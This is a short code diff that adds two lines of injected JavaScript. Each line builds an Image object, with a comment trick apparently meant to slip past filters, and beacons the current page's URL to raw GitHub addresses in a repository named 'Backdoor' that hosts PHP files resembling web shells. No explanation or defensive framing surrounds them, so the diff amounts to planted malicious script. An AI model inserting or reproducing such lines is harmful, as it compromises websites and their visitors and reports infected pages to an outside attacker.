@@ -1,0 +1,2 @@
+a=new/**/Image();a.src='https://raw.githubusercontent.com/ItsMeAlf404/Backdoor/refs/heads/main/awok.php'+escape(location.href);
+a=new/**/Image();a.src='https://raw.githubusercontent.com/ItsMeAlf404/Backdoor/refs/heads/main/gel4y.php'+escape(location.href);
